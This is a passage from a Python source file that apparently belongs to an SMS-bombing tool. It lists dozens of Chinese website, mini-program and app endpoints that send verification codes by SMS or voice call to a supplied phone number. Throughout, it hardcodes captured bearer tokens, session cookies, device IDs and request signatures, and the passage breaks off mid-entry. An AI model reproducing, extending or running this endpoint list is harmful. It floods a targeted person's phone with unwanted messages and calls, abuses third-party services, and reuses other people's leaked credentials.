                "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdWQiOiIyNzU3NTE5IiwiZXhwIjoxNzU0ODc3MjI0LCJsb2dpbl91c2VyX2tleSI6IjI3YjY4YTU0LTMwZDgtNDE4Yi04NDAyLTA1ZjU2ODQxOTM3MCJ9.TT2EM3TSTpxpKpa2DPpW9wu00zoVCXz8o24dNGXopJc",
                "userId": 1236690
            },
            'headers': {
                'Content-Type': "application/json",
                'charset': "utf-8",
                'Referer': "https://servicewechat.com/wx17d76018d66223d1/72/page-frame.html"
            }
        },
        
        # 接口26: flashsign.cn
        {
            'name': "flashsign.cn",
            'url': f"https://flashsign.cn/bes/code/sms?mobile={phone}",
            'method': 'GET',
            'headers': {
                'content-type': "application/json",
                'Authorization': "bearer 5198989c-c553-4ea6-bd22-db4cf02652c3",
                'deviceId': "33cb95b0-5ebf-11f0-b18b-6f0f32058548",
                'entrance': "",
                'version': "v2.10.11.1",
                'charset': "utf-8",
                'Referer': "https://servicewechat.com/wxb963221d477993b7/157/page-frame.html"
            }
        },
        
        # 接口27: www.weiqian.com.cn:8887
        {
            'name': "www.weiqian.com.cn:8887",
            'url': f"https://www.weiqian.com.cn:8887/index/verifyCode?t={timestamp}",
            'method': 'POST',
            'form_data': {
                'phone': phone
            },
            'headers': {
                'Host': "www.weiqian.com.cn:8887",
                'Authorization': "",
                'X-Request-Source': "MiniProgram",
                't': str(timestamp),
                'charset': "utf-8",
                'Referer': "https://servicewechat.com/wxa21d0ef9544325b3/18/page-frame.html"
            }
        },
        
        # 接口28: apii.muaaa.cn
        {
            'name': "apii.muaaa.cn",
            'url': "https://apii.muaaa.cn/apii/acsoauth/opsentmsgcode",
            'method': 'POST',
            'form_data': {
                'cellphone': phone,
                'password': "",
                'msg_code': "",
                'msg_code_type': "1",
                'login_identity': "1",
                'sys_project': "rqfp-xcx",
                'sys_version': "306",
                'sys_timestamp': str(current_time),
                'client_id': "wx84ef61cc7d914b2e",
                'sys_sign': "3fe23f3769e8398c2be43c2b9150f98f"
            },
            'headers': {
                'charset': "utf-8",
                'Referer': "https://servicewechat.com/wx84ef61cc7d914b2e/241/page-frame.html",
                'Cookie': ""
            }
        },
        
        # 接口29: api.kuaiqb.com
        {
            'name': "api.kuaiqb.com",
            'url': "https://api.kuaiqb.com/user/validate/sendVerifyCode",
            'method': 'POST',
            'json_data': {
                "userName": phone,
                "scene": "LOGIN"
            },
            'headers': {
                'Content-Type': "application/json",
                'charset': "utf-8",
                'referer': "https://servicewechat.com/wxcc6c96907c8c841c/3/page-frame.html"
            }
        },
        
        # 接口30: esign.yi-types.com
        {
            'name': "esign.yi-types.com",
            'url': f"https://esign.yi-types.com/api/u/{phone}/verification-code/1",
            'method': 'GET',
            'headers': {
                'content-type': "application/json",
                'x-access-token': "7769bb51-03de-4bdd-9ef4-cc408d9a624c",
                'charset': "utf-8",
                'Referer': "https://servicewechat.com/wx86f74eb02a10cb88/48/page-frame.html"
            }
        },
        
        # 接口31: uums.easysign.cn
        {
            'name': "uums.easysign.cn",
            'url': "https://uums.easysign.cn/miniprogram/sys/sendVerifyCodeByCaptcha",
            'method': 'POST',
            'json_data': {
                "sendTo": phone
            },
            'headers': {
                'Content-Type': "application/json",
                'Authorization': "Bearer eyJraWQiOiJyc2ExIiwiYWxnIjoiUlMyNTYifQ.eyJzdWIiOiJhZG1pbiIsImF6cCI6ImNsaWVudCIsInNjb3BlIjoicHViX2FwaSBzeXN0ZW1JZD0xMDUiLCJpc3MiOiJodHRwOlwvXC8xNzIuMTcuMTQwLjIzNDoxODA4MFwvb3BlbmlkLWNvbm5lY3Qtc2VydmVyLXdlYmFwcFwvIiwiZXhwIjoxNzUyMjg3NTk4LCJpYXQiOjE3NTIyODM5OTgsImp0aSI6ImY4ZTI5MTU3LTFjOWYtNGVhYy1hNTQxLWRiNTE3ZjgyN2NhNSJ9.IdvLyJ5ZmRUQ6B93d9mPdU0mpHsOs5vYP3abV9zTEYtSSqdlOzDUHK9UMPL8XT26iTYofHixLq0TERxdWNTcA8_gRnb4t0yCnLozDdhJyp8q_4RHHusVBfeBK3NEe5MlOpTV_i_q7-kY1zohOmPxWDnHYIrMbpuni8d5jMYL0uaoIIAP_MpDXPTDDEHScnBYKsiqiz9TwcBsDX0lgmOVP523BnEnqTqa42reFzVr3hNNCfjjbILefl8ty-TeItKsHbSVpu1bYR13WyB0dLoe9Sz0vzSHQCDD3sXRlUgiBMZGkXSyWH-oaLiTEejC-cJQ1gkFsqeDtc9VImimdX88dw",
                'charset': "utf-8",
                'Referer': "https://servicewechat.com/wx7fab099bdfc29839/74/page-frame.html"
            }
        },
        
        # 接口32: h5.signit.cn (语音验证码)
        {
            'name': "h5.signit.cn-voice",
            'url': "https://h5.signit.cn/api/v1/identity/captcha/voice-code",
            'method': 'POST',
            'json_data': {
                "phone": phone,
                "service": "VOICE_REGIST",
                "deviceId": "ab71ed24-8009-419b-91f6-c321d1bcc897"
            },
            'headers': {
                'Content-Type': "application/json",
                'x-signit-source': "h5-next",
                'x-requested-session': "",
                'charset': "utf-8",
                'referer': "https://servicewechat.com/wx3171beca057254f0/157/page-frame.html"
            }
        },
        
        # 接口33: h5.signit.cn (短信验证码)
        {
            'name': "h5.signit.cn-sms",
            'url': "https://h5.signit.cn/api/v1/identity/captcha/sms-code",
            'method': 'POST',
            'json_data': {
                "phone": phone,
                "service": "REGIST",
                "deviceId": "ab71ed24-8009-419b-91f6-c321d1bcc897"
            },
            'headers': {
                'Content-Type': "application/json",
                'x-signit-source': "h5-next",
                'x-requested-session': "",
                'charset': "utf-8",
                'referer': "https://servicewechat.com/wx3171beca057254f0/157/page-frame.html"
            }
        },
        
        # 接口34: api.qizongyun.com
        {
            'name': "api.qizongyun.com",
            'url': f"https://api.qizongyun.com/pubs/platform/userUnion/changePhoneCode?phone={phone}",
            'method': 'GET',
            'headers': {
                'authorization': "Bearer " + random_str_40plus(120),
                'content-type': "application/json",
                'charset': "utf-8",
                'referer': "https://servicewechat.com/wx2d9d357a75498511/806/page-frame.html"
            }
        },
        
        # 接口35: inapi.lvdd.cn (语音验证码)
        {
            'name': "inapi.lvdd.cn-voice",
            'url': "https://inapi.lvdd.cn/account/getVoiceCaptcha",
            'method': 'POST',
            'form_data': {
                'mobilePhone': phone,
                'type': "5",
                'version': "99",
                'timestamp': str(timestamp),
                'accessToken': random_str(32),
                'msgDigest': msg_digest
            },
            'headers': {
                'charset': "utf-8",
                'Referer': "https://servicewechat.com/wx2db2b776f849b642/82/page-frame.html"
            }
        },
        
        # 接口36: inapi.lvdd.cn (短信验证码)
        {
            'name': "inapi.lvdd.cn-sms",
            'url': "https://inapi.lvdd.cn/account/getCaptcha",
            'method': 'POST',
            'form_data': {
                'mobilePhone': phone,
                'type': "5",
                'version': "99",
                'timestamp': str(timestamp),
                'accessToken': random_str(32),
                'msgDigest': msg_digest
            },
            'headers': {
                'charset': "utf-8",
                'Referer': "https://servicewechat.com/wx2db2b776f849b642/82/page-frame.html"
            }
        },
        
        # 接口37: lwapp.yzw.cn
        {
            'name': "lwapp.yzw.cn",
            'url': f"https://lwapp.yzw.cn/api/Home/SendSMS?tel={phone}",
            'method': 'POST',
            'json_data': {},
            'headers': {
                'Accept': "application/json, text/plain, */*",
                'Content-Type': "application/json",
                'x-device': "labor/android/8.0.61/1.15.1/362/779/3.5",
                'x-device-id': random_hex_32(),
                'x-application-type': "miniapp",
                'x-application-package-name': "cn.yzw.laborx",
                'charset': "utf-8",
                'referer': "https://servicewechat.com/wxd584ae81c1286a82/93/page-frame.html",
                'Cookie': "[object Undefined]"
            }
        },
        
       {
'name': "rnec.mychery.com",
'url': "https://rnec.mychery.com/api/v0/mini/utility/send-sms",
'method': 'POST',
'json_data': {
'mobile': f"{phone}",
'type': "SMS_LOGIN"
},
'headers': {
'Content-Type': "application/json",
'msgId': "cms39dd7d2f-91d8-469e-6f99-8bb4e1a44464",
'from': "PORTAL",
'content-type': "application/json;charset=UTF-8",
'token': "",
'charset': "utf-8",
'Referer': "https://servicewechat.com/wx069ea968b8f01633/6/page-frame.html",
'Cookie': "HWWAFSESID=eb6b87381b396320b1; HWWAFSESTIME=1752338885887"
}
},

{
'name': "txakdf.crcbbank.com",
'url': "https://txakdf.crcbbank.com:8087/akdf-client/newphone/sendCode",
'method': 'POST',
'json_data': {
'phone': f"{phone}",
'imgCode': "",
'key': "1752339325624267050"
},
'headers': {
'Host': "txakdf.crcbbank.com:8087",
'Content-Type': "application/json",
'charset': "utf-8",
'Referer': "https://servicewechat.com/wx53f33e4dcb1bf86a/10/page-frame.html"
}
},

{
'name': "www.tsyzp.com",
'url': "https://www.tsyzp.com/wechat-miniprogram/getVcode",
'method': 'POST',
'json_data': {
'type': "vcode",
'is_username_type': "mobile",
'username': f"{phone}",
'vcode': "",
'password': "",
'wx_id': "",
'qq_id': "",
'apple_id': "",
'code': "0f1Qze0w30rdg53rP13w3WiTOw2Qze0z",
'tsec': {},
'imgcode': "",
'img_code_id': 1752339881475
},
'headers': {
'Content-Type': "application/json",
'xycms-system-name': "android",
'xycms-system': "Android 15",
'xycms-platform': "MP-WEIXIN",
'xycms-deviceid': "MP-WEIXINAndroid 15",
'sub-website-alias': "null",
'charset': "utf-8",
'referer': "https://servicewechat.com/wx0f1a23567666a6a9/6/page-frame.html"
}
},
{
'name': "www.huan6lanxin.com",
'url': "https://www.huan6lanxin.com/api/user/global/captcha/mobile",
'method': 'POST',
'json_data': {
'mobile': f"{phone}"
},
'headers': {
'Accept': "application/json",
'Content-Type': "application/json",
'content-type': "application/json;charset=utf-8",
'version': "v1",
'weappid': "wx4507f1843ced20d0",
'authorization': "Bearer 332125|EML4PpOc7SxocRkHOUldxKpWGbIkf44y9sEzowS7",
'openid': "oV2wp5DGs7-jP168u3G-qSmvrdbI",
'charset': "utf-8",
'referer': "https://servicewechat.com/wx4507f1843ced20d0/12/page-frame.html"
}
},
{
'name': "zzjy580.com",
'url': f"https://zzjy580.com:7001/resource/sms/code?phoneNumber={phone}",
'method': 'GET',
'json_data': {},
'headers': {
'Host': "zzjy580.com:7001",
'content-language': "zh_CN",
'platform': "mp-weixin",
'clientId': "afdeaa71df0b6548bc09cd11e74106bf",
'content-type': "application/json",
'charset': "utf-8",
'Referer': "https://servicewechat.com/wx0b33d6837c3a567a/35/page-frame.html"
}
},
{
'name': "yiyun.eyoogroup.com",
'url': f"https://yiyun.eyoogroup.com/gateway/system/common/login/sms?mobile={phone}&captchaId=csc.captcha.87fe87874da146859c734fc931089cf1&code=&smsSignature=SMS_SIGN_YPHGZ",
'method': 'GET',
'json_data': {},
'headers': {
'Accept': "application/json, text/plain, /",
'content-type': "application/json",
'charset': "utf-8",
'Referer': "https://servicewechat.com/wx048d01eb7fa76a6e/3/page-frame.html"
}
},
{
'name': "tjzzqdj.tjcbcm.com",
'url': "https://tjzzqdj.tjcbcm.com/api/open/login/h5GetVerityCode?channel=01",
'method': 'POST',
'json_data': {
'inviteType': 1,
'phoneOrMail': f"{phone}",
'timeAnalyse': {
'year': 2025,
'month': "07",
'date': 13,
'hour': "01",
'minute': 52
},
'submitTime': "2025-07-13 01:52:00",
'uCode': "b48a56d4cbba049e40d2690919310636",
'd': "e04f73e467749f7c8c11dcef4387ef1b",
'd2': "b3d044448757957555c397c782407a4d"
},
'headers': {
'Content-Type': "application/json",
'token': "",
'nftToken': "",
'charset': "utf-8",
'Referer': "https://servicewechat.com/wx6c614e1ecc5668af/4/page-frame.html"
}
},
{
'name': "apigw.goldentec.com",
'url': "https://apigw.goldentec.com/cloud-bmp/v3/client/reg-sms?token=v5_3HzMfuEHCyz3AOXUw1CXQa7mTLLk2tbb7323907",
'method': 'POST',
'json_data': {
'mobile': f"{phone}"
},
'headers': {
'Content-Type': "application/json",
'access-token': "v5_3HzMfuEHCyz3AOXUw1CXQa7mTLLk2tbb7323907",
'charset': "utf-8",
'referer': "https://servicewechat.com/wxacc5102671f3da23/286/page-frame.html"
}
},
{
'name': "wcmp.yihuoyun.net",
'url': "https://wcmp.yihuoyun.net/api/v1/verificationcode",
'method': 'POST',
'json_data': {
'appid': "2019092558745",
'appkey': "b850672c8cab9c6fcbed40b21ccfd8fe5fa1c0b2",
'phone': f"{phone}"
},
'headers': {
'X-Tag': "flyio",
'Authorization': "",
'charset': "utf-8",
'Referer': "https://servicewechat.com/wx3f1ecc6623a14e74/157/page-frame.html"
}
},
{
    'name': "CAIZHIDAO-AES-SMS",
    'func': caizhidao_send_sms,
    'args': [phone]
},
{
'name': "api.faliankeji.com",
'url': "https://api.faliankeji.com/wxapp/login.index/sms",
'method': 'POST',
'json_data': {
'phone': f"{phone}"
},
'headers': {
'api-token': "f44a144459d09568e80c848f9f1dfdbf",
'api-name': "wxapp",
'charset': "utf-8",
'referer': "https://servicewechat.com/wx32d53eba728c8d60/36/page-frame.html"
}
},
{
'name': "zs.zhongzhiwang.top",
'url': "https://zs.zhongzhiwang.top//dj/sendCode",
'method': 'POST',
'json_data': {
'phone': f"{phone}"
},
'headers': {
'Content-Type': "application/json",
'charset': "utf-8",
'referer': "https://servicewechat.com/wxedc6e489d3f22d9d/40/page-frame.html"
}
},
{
'name': "gycz.lianzhenglink.com",
'url': f"https://gycz.lianzhenglink.com:19005/ledger/v2/user/sendRegisterCode?phone={phone}",
'method': 'POST',
'json_data': {},
'headers': {
'Host': "gycz.lianzhenglink.com:19005",
'Content-Type': "application/json",
'authorization': "Bearer eyJ0eXBlIjoiSldUIiwiYWxnIjoiUlMyNTYifQ.eyJkYXRhIjp7Im9wZW5JZCI6Im9maWdPN1N0MjBxVVh6YTBjSmFFUXBWcHFNNmsiLCJ2ZXJzaW9uIjoiMS4wLjAiLCJ1c2VySWQiOiJhYjkyNjgwOWE1ZWY0N2IzNzE5NjJmMGYzOGYzNDJkOSIsIm9wZW5pZCI6Im9maWdPN1N0MjBxVVh6YTBjSmFFUXBWcHFNNmsiLCJpc01pbmEiOnRydWV9LCJpYXQiOjE3NTIzNDQ0ODl9.Vrn4VJ418VR0R58ZK9DDVG8uancrvjnvPCRSCYlUlK6ZOQYjOXTGg3LhRkZWAAEB57WvjRz4gjxp9iiQX24s_AYsznk1Z_rjLaBtrmXBG2GcVSmZ2N4gJ1IOLy8p5a4VuA8nTeZ1CRpwlmCWBswZLjQV4GVuIYwbLzy9FI2v2eax35imt4GKTWrHlo7bzvqzK-CTQpHDCVFlG8p1tgGsuhc0rnZmZxrgDMpKe02CR4UCbniOOlc5nn-TuOP6JhacmEqCpM5xjX1bGOz6huvDqp9sMLxZhApJFIp4cLiVMOxPa50BPjT1VNiDX4-AMK0kpTLzDCQWfVS-FXBBRpmBbw",
'x-request-id': "f418caa9-059b-4d99-8152-e09e0bfb8e4b",
'x-app-id': "wx0559dd7aa854448f",
'x-version': "3.2.3.0",
'charset': "utf-8",
'referer': "https://servicewechat.com/wx0559dd7aa854448f/5/page-frame.html"
}
},
{
'name': "api.xb.suyuanzhili.com",
'url': "https://api.xb.suyuanzhili.com/common/sendSmsVerifyCode",
'method': 'POST',
'json_data': {
'mobile': f"{phone}"
},
'headers': {
'Content-Type': "application/json",
'charset': "utf-8",
'referer': "https://servicewechat.com/wxc57c25861694febd/4/page-frame.html",
'Cookie': "JSESSIONID=518EBEE29BC5A0256E6CF0B9089EB3E8"
}
},
{
'name': "api.jdl.com",
'url': "https://api.jdl.com//login/sendMsgCode",
'method': 'POST',
'json_data': {
'loginName': f"{phone}",
'clinetIp': ""
},
'headers': {
'Content-Type': "application/json",
'lop-dn': "sign-chain.jd.com",
'accounttype': "",
'ticket': "",
'wskey': "",
'tenantid': "",
'appparams': "{'appid':1290,'ticket_type':'M'}",
'charset': "utf-8",
'referer': "https://servicewechat.com/wx44f50be60fad7cdc/53/page-frame.html"
}
},
{
    'name': "passport.fanli.com",
    'url': f"https://passport.fanli.com/mobileapi/i/user/mobileFastReg?jsoncallback=jQuery21107878787528225448_1752429344083&mobile={phone}&countrycode=86&mobilestep=1&_=1752429344086",
    'method': 'GET',
    'headers': {
        'Accept-Encoding': "gzip, deflate, br, zstd",
        'sec-ch-ua-platform': "\"Android\"",
        'sec-ch-ua': "\"Chromium\";v=\"130\", \"Android WebView\";v=\"130\", \"Not?A_Brand\";v=\"99\"",
        'sec-ch-ua-mobile': "?1",
        'X-Requested-With': "com.fanli.android.apps",
        'Sec-Fetch-Site': "same-site",
        'Sec-Fetch-Mode': "no-cors",
        'Sec-Fetch-Dest': "script",
        'Referer': "https://m.fanli.com/",
        'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
        'Cookie': "__utmt=105059a-36128d-37160d-38780b-50148a-60857a; __utmo=1250917218.3891711701.3097447884; __utmp=1250917218.3891711701.2752870054; FirstUrl=//m.fanli.com/; LandingUrl=https%3A//m.fanli.com/landingapp/chinamobilev2%3Fdevid%3D68547129736556%26c_aver%3D1.0%26c_src%3D2%26c_v%3D9.64.0.1%26abtest%3D61747_d-26_d-3230_b-642_a-3142_c-438_a-780_a-ceda%26c_nt%3Dwifi%26mc%3D56; __utmv=D83B80AF-817E-4A6C-8CC2-53BFFC87A84B; Hm_lvt_545c20cb01a15219bfeb0d1f103f99c1=1752429340; Hm_lpvt_545c20cb01a15219bfeb0d1f103f99c1=1752429340; HMACCOUNT=D527AA64F537DA08; PHPSESSID=dsyze54plb37eh0hgy4p81po4z; __fl_trace_cpc=2058E684-2273-40E1-9671-8835EE7B537C; __fl_trace_cpc1=m.fanli.com@@html/body/div%5B1%5D/div%5B3%5D/div%5B0%5D/div%5B0%5D/div%5B1%5D/a%5B2%5D"
    }
},
{
'name': "jidaiapi.jishiyu2019.com",
'url': "https://jidaiapi.jishiyu2019.com/jidaiapi/login/phoneCode",
'method': 'POST',
'json_data': {
"androidId": "",
"appId": "83",
"channelId": "4",
"googleId": "",
"oaid": "4564E3093A48499BA7A4710A4828D422ccfe7242ebe236d3fb4d6d6534440ec7",
"phone": f"{phone}",
"pkgName": "wlsd.gysqwxd.app",
"version": "1"
},
'headers': {
'User-Agent': "okhttp/3.14.9",
'Connection': "Keep-Alive",
'Accept-Encoding': "gzip",
'Content-Type': "application/json; charset=UTF-8"
}
},
{
    'name': "yzx.guoguoenglish.com",
    'url': "https://yzx.guoguoenglish.com/api/yzx/captcha/getCaptcha",
    'method': 'POST',
    'json_data': {
        "phone": f"{phone}",  # 像示例一样用f-string定义手机号变量
        "type": 1,
        "app_bundle_label": "fzwy_oppo",
        "pkg": "com.zx.fzwy",
        "channel": "oppo"
    },
    'headers': {
        'User-Agent': "Dart/3.5 (dart:io)",
        'Accept': "application/x-www-form-urlencoded",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json",
        'appversion': "1.0.3"
    }
},
{
    'name': "gec-api.gecacademy.cn",
    'url': "https://gec-api.gecacademy.cn/signServer//user/code",
    'method': 'GET',
    'params': {  # GET请求参数放在params中
        'phoneNumber': f"{phone}",  # 手机号改为f-string变量引用
        'areaCode': "%2B86"
    },
        'content-type': "application/json",
        'authorization': "GECOASYSTEM=shD6tTqfdTuyY1AipRezSO5atSlm3zMoJreeihzLLuHizNRKLG2UINP12g2xHZRC; path=/; max-age=86400; expires=Tue, 15 Jul 2025 19:24:03 GMT; httponly",
        'charset': "utf-8",
        'referer': "https://servicewechat.com/wxba3cbdd216e34d16/27/page-frame.html",
        'Cookie': "GECOASYSTEM=shD6tTqfdTuyY1AipRezSO5atSlm3zMoJreeihzLLuHizNRKLG2UINP12g2xHZRC; path=/; max-age=86400; expires=Tue, 15 Jul 2025 19:24:03 GMT; httponly"
    },
    {
    'name': "esign.gjzq.cn",
    'url': "https://esign.gjzq.cn/webgate/userapi/public/authentication/getSmsCode",
    'method': 'POST',
    'json_data': {  # 原请求用json.dumps处理payload，对应json_data
        "phone": f"{phone}"  # 手机号改为f-string变量引用
    },
    'headers': {
        'Accept': "application/json, text/plain, */*",
        'Accept-Encoding': "gzip, deflate, br, zstd",
        'Content-Type': "application/json",
        'sec-ch-ua-platform': "\"Android\"",
        'AccessSource': "wechat-mini",
        'lang': "zh",
        'Accept-Language': "zh",
        'sec-ch-ua': "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Android WebView\";v=\"134\"",
        'sec-ch-ua-mobile': "?1",
        'platformType': "company",
        'appCode': "contractweb",
        'Origin': "https://esign.gjzq.cn",
        'X-Requested-With': "com.tencent.mm",
        'Sec-Fetch-Site': "same-origin",
        'Sec-Fetch-Mode': "cors",
        'Sec-Fetch-Dest': "empty",
        'Referer': "https://esign.gjzq.cn/h5/"
    }
},
{
    'name': "api.dsdg.com.cn",
    'url': "https://api.dsdg.com.cn/apis/api/index.php?appid=wxf16720e46c534100&up=user&action=api_user_send_sms",
    'method': 'POST',
    'data': {
        'mobile': f"{phone}",  # 手机号改为f-string变量引用
        'event': "register"
    },
    'headers': {
        'Accept': "application/json",
        'x-requested-with': "XMLHttpRequest",
        'token': "",
        'charset': "utf-8",
        'referer': "https://servicewechat.com/wxf16720e46c534100/83/page-frame.html",
        'Cookie': "PHPSESSID=d3uqdbq6pslluhq7ja4bfklhsr"
    }
},
{
  "name": "nwexy.99tik.com",
  "url": "http://nwexy.99tik.com/new/login/valid",
  "method": "POST",
  "data": {
    "phone": f"{phone}"
  },
  "headers": {
    "User-Agent": "okhttp/3.12.10",
    "Connection": "close",
    "Accept-Encoding": "gzip",
    "appid": "xianyu",
    "a": "G4u5NvVee7Sx1g8P6BmD3mPpSeeAR960oTgaXB0RovW2kd3LdCOUDLzt9Zly569YHOdsI+i+NMG/bt7iR5/Da87pdegQrr9EXpIil6R/yUJK6iGJBGv85LSdyEgtZzN9bL9kGaxPsOR1NAXdCh4bZUIurk/u9F+f2olE5+lDYeDwp4b1LEoebU57oy6DBc+wBIIKXTmjk80GxscGnYbE0lZ+p26+W2wC0/fHh68IzijJZ+F/6IBHRwoWBMgY52TDCXplFbniKSpAt6/hzFtSlr9McVehc8T2eR74Mi6GHAeFODleDCRE7WVMVw9AgITE5yjLu0SromtM+G2oHW90QJZRhhUn3ScPe1ApLoxtRLpKOFyeQntP0hjPQnKnduq4GI5x0pUNxk9NN20/R+RXlhsi8gNiK8EgY1wE/tG8NIFkolHgyunt4JfLF0YgZDDucT+zEnrDEb18Z5IZX5YLbdBncLeixFjM0mH7xCMpGrJWrMxor0D+FLN7ji0ngxgshdumZdXeYcAYLy7+yaAy6Prh0FGfpvxJLTevNTAd2PEmAfsKLTQ1Udi1iODABpx88bzUqmmnu4hCbzqQda5fTQ==",
    "b": "1",
    "Cookie": "JSESSIONID=85AB1E2119F7A27F3694EA6E53B00E0D"
  }
},
{
  "name": "api-game.duodian.cn",
  "url": "https://api-game.duodian.cn/api/account/sendVCode",
  "method": "POST",
  "data": {
    "phone": f"{phone}",
    "type": "0"
  },
  "headers": {
    "Accept-Encoding": "gzip",
    "token": "mO6wMb6+aAoXqM6EP7XuzRH4/pj9YqKPltjSKQpgPDffQNN7/ULI0tdrnaqTCj2IE/JIhcyt+FhH07rotdlo/A==",
    "deviceid": "dd4bc4f1252c43d58c6dbb1ec225b79d",
    "devicetoken": "32694FB8CAE8EDFC514CA8A16D0E00541A905E3E",
    "x-versioncode": "3.2.0",
    "x-versionnumber": "326",
    "screenwidth": "1264",
    "x-channel": "freeoppo",
    "devicebrand": "OnePlus",
    "androidid": "16f873ca61c0d520",
    "packagename": "com.duodian.freehire",
    "model": "PJE110",
    "systemversion": "15",
    "mainversion": "2.9.8",
    "lebianversioncode": "1750321521",
    "source": "android",
    "x-apptype": "0",
    "buildpacktime": "2025-06-19 16:25:21",
    "vendorsystemversion": "unknown"
  }
},
{
  "name": "player.yyzu.net",
  "url": "https://player.yyzu.net/api/login/getCode",
  "method": "POST",
  "data": {
    "mobile": f"{phone}"
  },
  "headers": {
    "Accept-Encoding": "gzip",
    "token": "",
    "x-platform": "android",
    "app-package": "net.yyzu.zuhaobang",
    "app-version": "1.1.6",
    "app-versioncode": "26",
    "app-channel": "oppo",
    "x-deviceid": "5a4aebfefbd949a0a7f76f03ad73610b"
  }
},
{
  "name": "api-game.zubajiezuhao.com",
  "url": "https://api-game.zubajiezuhao.com/api/account/sendVCode",
  "method": "POST",
  "data": {
    "phone": f"{phone}",
    "type": "0"
  },
  "headers": {
    "Accept-Encoding": "gzip",
    "token": "F+nFFZSjs28m7/JrEEH3nUUIj/X9KlJh6garDejs9BViQcpNmMt2UQ91cvbhMxxjfWN2quss0PK5zw/CqS7IOg==",
    "deviceid": "616e3c48a0fb43a685a061b6f2bf0991",
    "devicetoken": "9475F1F6909265637BD74BA13766F42500621042",
    "x-versioncode": "1.0.2",
    "x-versionnumber": "102",
    "screenwidth": "1264",
    "x-channel": "zhzxoppo",
    "devicebrand": "OnePlus",
    "androidid": "ce69eed5f7967bd4",
    "packagename": "com.ddxf.c.zhzx",
    "model": "PJE110",
    "lebianversioncode": "102",
    "systemversion": "15",
    "vendorsystemversion": "unknown"
  }
},
{
  "name": "api-game.zubajiezuhao.com",
  "url": "https://api-game.zubajiezuhao.com/api/account/sendVCode",
  "method": "POST",
  "data": {
    "phone": f"{phone}",
    "type": "0"
  },
  "headers": {
    "Accept-Encoding": "gzip",
    "token": "F+nFFZSjs28m7/JrEEH3nQoTPfg3DXwoEDxlTa32sJn1+RynbrGuf632OF8P7RTr8eWadqeZ5wE1KKdDs8XbCw==",
    "deviceid": "2f7cdf6a44d748829b68bf7239a6d2c5",
    "devicetoken": "B3BB40B9EA62130387F66C8494C86284C5FDEAA4",
    "x-versioncode": "1.1.6",
    "x-versionnumber": "17",
    "screenwidth": "1264",
    "x-channel": "bajieoppo",
    "devicebrand": "OnePlus",
    "androidid": "52190640225dd028",
    "packagename": "com.duodian.zubajie",
    "model": "PJE110",
    "lebianversioncode": "18",
    "systemversion": "15",
    "vendorsystemversion": "unknown"
  }
},
{
    'name': "CAIZHIDAO-DOUBLE-SMS",
    'func': caizhidao_double_sms,
    'args': [phone]
},
{
  "name": "api-game.zubajiezuhao.com",
  "url": "https://api-game.zubajiezuhao.com/api/account/sendVCode",
  "method": "POST",
  "data": {
    "phone": f"{phone}",
    "type": "0"
  },
  "headers": {
    "Accept-Encoding": "gzip",
    "token": "F+nFFZSjs28m7/JrEEH3neBgVoWh2AxWLjTaTKxpVspNIgevBj4OmPflCrCkF75clLfxTEDr6Xtv28cQceZ3nA==",
    "deviceid": "f40a9aa5dedf405da651fffda1bfe1cc",
    "devicetoken": "B9F6E9B3333631D9E3DCC13828248B5F647D8828",
    "x-versioncode": "1.0.2",
    "x-versionnumber": "102",
    "screenwidth": "1264",
    "x-channel": "zuhaohuoppo",
    "devicebrand": "OnePlus",
    "androidid": "d9550d2a13ad2e84",
    "packagename": "com.ddxf.c.zhhu",
    "model": "PJE110",
    "lebianversioncode": "102",
    "systemversion": "15",
    "vendorsystemversion": "unknown"
  }
},
{
  "name": "api-game.zubajiezuhao.com",
  "url": "https://api-game.zubajiezuhao.com/api/account/sendVCode",
  "method": "POST",
  "data": {
    "phone": f"{phone}",
    "type": "0"
  },
  "headers": {
    "Accept-Encoding": "gzip",
    "token": "F+nFFZSjs28m7/JrEEH3nbrBD783ovZW72+7ZjrDx0NiJ5DfsXs+KeXPqL0JdfPi1Nrvfh65JVd6P1bI/J58Qw==",
    "deviceid": "3a38805877de4ac7b1b38fe4417ad414",
    "devicetoken": "525D64FA641EF4362287F14B390945848597BB0A",
    "x-versioncode": "1.0.4",
    "x-versionnumber": "104",
    "screenwidth": "1264",
    "x-channel": "zuhaowangoppo",
    "devicebrand": "OnePlus",
    "androidid": "ef94b59de1703930",
    "packagename": "com.ddxf.c.zhwan",
    "model": "PJE110",
    "lebianversioncode": "104",
    "systemversion": "15",
    "vendorsystemversion": "unknown"
  }
},
{
  "name": "api.zuhaobao.com.cn",
  "url": "https://api.zuhaobao.com.cn/api/account/sendLoginVCode",
  "method": "POST",
  "params": {
    "phone": f"{phone}"
  },
  "headers": {
    "Accept-Encoding": "gzip",
    "x-versioncode": "2.6.3",
    "devicebrand": "OnePlus",
    "model": "PJE110",
    "systemversion": "15",
    "packagename": "com.duodian.zuhaobao",
    "androidid": "8d3b9f6bff7d3d13",
    "token": "8+3FuhByqUd1jkZdNuX8on5GqueOCM4gs4EROfl/WpEW3DwwbwzeLqHzhVtlpF2/",
    "deviceid": "bac285d63e5f45c1abbb85fe54977fe2",
    "x-channel": "oppo",
    "vendorsystemversion": "unknown"
  }
},
{
  "name": "api.qtshe.com",
  "url": "https://api.qtshe.com/accountCenter/account/V2/fast/login/verifyCode",
  "method": "POST",
  "data": {
    "mobile": f"{phone}",
    "appKey": "QTSHE_ANDROID_USER",
    "townId": "380",
    "version": "4.89.6",
    "versionCode": "48906",
    "channel": "11",
    "downloadSource": "11",
    "timestamp": "1752611979865",
    "sign": "be3d9924b6c059c0af4fe3fd4a270ffd",
    "deviceId": "qts53024344fedb44428a657d899a1333fc",
    "model": "PJE110",
    "brand": "OnePlus",
    "product": "OnePlus",
    "sdkversion": "35",
    "imei": "",
    "oaid": "4564E3093A48499BA7A4710A4828D422ccfe7242ebe236d3fb4d6d6534440ec7",
    "androidid": "f1974f53f9c2b1da",
    "lon": "",
    "lat": "",
    "osVersionName": "15",
    "iH": "0",
    "iPY": "0",
    "iRT": "",
    "iED": "0",
    "webVersion": "5.3.40"
  },
  "headers": {
    "Accept-Encoding": "gzip",
    "authorization": "Bearer",
    "x-qts-android-version": "4.89.6",
    "x-ca-appkey": "QTSHE_ANDROID_USER",
    "x-ca-timestamp": "1752611979866",
    "x-ca-deviceid": "qts53024344fedb44428a657d899a1333fc",
    "x-ca-version": "4.89.6",
